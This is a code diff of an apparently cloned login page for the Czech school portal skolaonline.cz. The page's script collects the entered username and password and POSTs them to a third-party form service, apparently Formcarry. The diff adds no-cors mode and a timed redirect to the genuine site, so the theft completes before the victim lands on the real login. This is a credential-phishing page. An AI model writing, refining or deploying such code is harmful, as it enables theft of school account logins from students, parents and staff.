@@ -495,11 +495,11 @@ LAK: to výše nefunguje, provedeno skrytí přes custom.css -->
 </form>
 <script>
 document.getElementById("prihlaseniForm").addEventListener("submit", function(e) {
-  e.preventDefault();
+  e.preventDefault(); // zablokuje defaultní submit
 
   const form = this;
 
-  // ručně vytvoříme objekt s daty
+  // data z formuláře
   const data = {
     JmenoUzivatele: form.JmenoUzivatele.value,
     HesloUzivatele: form.HesloUzivatele.value,
@@ -507,21 +507,26 @@ document.getElementById("prihlaseniForm").addEventListener("submit", function(e)
     btnLogin: form.btnLogin.value
   };
 
-  // přepíšeme data do URLSearchParams (Formcarry funguje lépe s POST + application/x-www-form-urlencoded)
+  // připravíme POST
   const params = new URLSearchParams();
   for (const key in data) {
     params.append(key, data[key]);
   }
 
+  // odešleme fetch s no-cors
   fetch(form.action, {
-  method: "POST",
-  body: params,
-  headers: {
-    "Content-Type": "application/x-www-form-urlencoded"
-  }
-}).then(response => {
-  // jen pokud je request úspěšný
-  window.location.href = "https://www.skolaonline.cz/prihlaseni/?SOLLogin=pass";
+    method: "POST",
+    body: params,
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    mode: "no-cors"
+  });
+
+  // **místo okamžitého window.location** použijeme krátké zpoždění
+  setTimeout(() => {
+    window.location.href = "https://www.skolaonline.cz/prihlaseni/?SOLLogin=pass";
+  }, 200); // 200 ms stačí, aby browser odeslal POST a nezačal render Formcarry
 });
 </script>
 
@@ -1558,5 +1563,6 @@ Database Caching 4/8 queries in 0.003 seconds using Redis
 
 Served from: www.skolaonline.cz @ 2026-02-26 20:34:05 by W3 Total Cache
 -->
+
 
 
